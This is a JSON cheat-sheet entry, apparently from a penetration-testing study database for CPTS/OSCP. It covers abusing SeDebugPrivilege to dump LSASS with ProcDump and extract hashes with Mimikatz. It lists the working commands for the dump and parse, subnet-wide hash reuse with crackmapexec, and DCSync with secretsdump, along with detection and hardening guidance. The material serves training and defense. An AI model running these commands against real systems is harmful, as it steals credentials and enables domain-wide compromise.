@@ -1,0 +1,96 @@
+{
+  "type": "command",
+  "platform": "windows",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "procdump",
+    "mimikatz"
+  ],
+  "tags": [
+    "sedebug",
+    "lsass",
+    "mimikatz",
+    "credentials"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Windows - Token Privileges",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 26: Windows Privilege Escalation",
+  "examples": [
+    {
+      "label": "Dump LSASS to disk with procdump",
+      "command": "procdump.exe -accepteula -ma lsass.exe lsass.dmp"
+    },
+    {
+      "label": "Load the dump in mimikatz offline",
+      "command": "mimikatz # log\nmimikatz # sekurlsa::minidump lsass.dmp"
+    },
+    {
+      "label": "Extract logon passwords/hashes",
+      "command": "mimikatz # sekurlsa::logonpasswords"
+    }
+  ],
+  "notes": "=== SeDebugPrivilege — LSASS Credential Dump ===\nUse debug privilege to open a handle to LSASS and dump credentials for all logged-on users.\n\n=== ATTACK FLOW ===\n1. Confirm: whoami /priv → SeDebugPrivilege (may show Disabled — still exploitable in elevated shell)\n2. Check LSASS protection:\n   reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v RunAsPPL\n   RunAsPPL=1 → need driver bypass; RunAsPPL=0 → ProcDump works directly\n\n3. Dump with ProcDump:\n   .\\procdump.exe -accepteula -ma lsass.exe lsass.dmp\n\n4. Transfer dump to attack host (SMB or Python HTTP server)\n\n5. Process with Mimikatz:\n   mimikatz# log\n   mimikatz# sekurlsa::minidump lsass.dmp\n   mimikatz# sekurlsa::logonpasswords\n\n=== ALTERNATIVE — TASK MANAGER (NO TOOL TRANSFER NEEDED) ===\nDetails tab → right-click lsass.exe → Create dump file\nProduces identical dump → process with Mimikatz identically\n\n=== CREDENTIAL TYPES RECOVERED ===\nNTLM hashes → pass-the-hash to any SMB/WMI/RDP target\nKerberos tickets → pass-the-ticket, overpass-the-hash\nCleartext passwords → if WDigest enabled or on older OS (pre-Win8.1/2012R2)\nWDigest check: reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest\" /v UseLogonCredential\n\n=== CHAINING CONTEXT ===\nSeDebugPrivilege on dev account → LSASS dump → domain admin hash → DCSync or PTH\nSame local admin NTLM hash across multiple hosts (gold image environments) = instant lateral movement\nNTLM hash → crackmapexec smb 10.x.x.0/24 -H <hash> --local-auth → find all reuse targets\nAfter LSASS dump → secretsdump -hashes :<NTLM> domain/user@DC_IP → domain-wide DCSync\n\n=== WHAT TO LOOK FOR ===\nSeDebugPrivilege assigned via GPO: Computer Settings > Security Settings > Local Policies > User Rights Assignment\nDev accounts often assigned for debugging system components — check non-admin dev accounts\nAssigned-but-Disabled: still usable in elevated shell (UAC bypass may be needed first)",
+  "references": [
+    {
+      "title": "Microsoft Sysinternals - ProcDump",
+      "url": "https://learn.microsoft.com/en-us/sysinternals/downloads/procdump"
+    },
+    {
+      "title": "Mimikatz",
+      "url": "https://github.com/gentilkiwi/mimikatz"
+    },
+    {
+      "title": "HTB Academy - Windows Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/67"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "sedebug-psgetsystem",
+      "note": "Same privilege used to spawn a SYSTEM process instead.",
+      "rel": "alternative"
+    },
+    {
+      "id": "winpe-user-group-enum",
+      "note": "Confirms SeDebugPrivilege is held.",
+      "rel": "prereq"
+    }
+  ],
+  "id": "sedebug-lsass-dump",
+  "name": "SeDebugPrivilege - Dump LSASS and Parse",
+  "command": "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
+  "description": "SeDebugPrivilege lets you read LSASS memory. Dump it with ProcDump, then parse the minidump offline with Mimikatz to recover plaintext passwords and NTLM hashes.",
+  "opsec": "loud",
+  "mitre": [
+    "T1003.001"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "SeDebugPrivilege grants the ability to open any process (including SYSTEM processes) with PROCESS_ALL_ACCESS, bypassing normal DACL protections. ProcDump uses this privilege to create a memory dump of lsass.exe. Mimikatz sekurlsa::minidump then extracts NTLM hashes and Kerberos tickets from the dump offline, even without Mimikatz touching the live lsass process.",
+    "prerequisites": "SeDebugPrivilege in the current token (Administrators have it by default). ProcDump.exe available. Mimikatz or pypykatz for offline processing. The dump must not be blocked by PPL (Protected Process Light).",
+    "impact": "Extraction of all cached NTLM hashes, Kerberos tickets, and plaintext credentials (if WDigest is enabled) for all users with active sessions, enabling pass-the-hash attacks and lateral movement.",
+    "detection": "ProcDump accessing lsass.exe (Event ID 10 in Sysmon: process access to lsass). Large .dmp file creation. Windows Defender: LSASS access protection alert. EDR: credential dumping detection.",
+    "artifacts": "Process: procdump.exe accessing lsass.exe (Sysmon Event 10) | File: lsass.dmp created in temp directory | Process: mimikatz.exe offline processing | Security event: new process creation from procdump",
+    "prevention": "Enable Windows Defender Credential Guard — prevents extraction of NTLM hashes from memory. Enable PPL (Protected Process Light) for LSASS. Restrict SeDebugPrivilege: remove from Administrators in high-security environments. Deploy EDR with LSASS protection. Disable WDigest (disable plaintext password caching).",
+    "misconfiguration": "Credential Guard not enabled. LSASS PPL not enabled. WDigest enabled (Windows 7 default). No EDR monitoring LSASS access. SeDebugPrivilege available to all local admins without additional controls.",
+    "vulnerable_config": "# Dump lsass with SeDebugPrivilege:\nprocdump.exe -accepteula -ma lsass.exe lsass.dmp\n\n# Offline extraction:\nmimikatz.exe\nsekurlsa::minidump lsass.dmp\nsekurlsa::logonpasswords",
+    "secure_config": "# Enable Credential Guard:\n# GPO: Computer Configuration > Admin Templates > System > Device Guard\n# > Turn on Virtualization Based Security\n# > Credential Guard Configuration = Enabled with UEFI lock\n\n# Enable LSASS PPL:\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 1\n\n# Disable WDigest:\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 0",
+    "sources": [
+      "HTB M26",
+      "MITRE T1003.001",
+      "MITRE T1078"
+    ]
+  }
+}
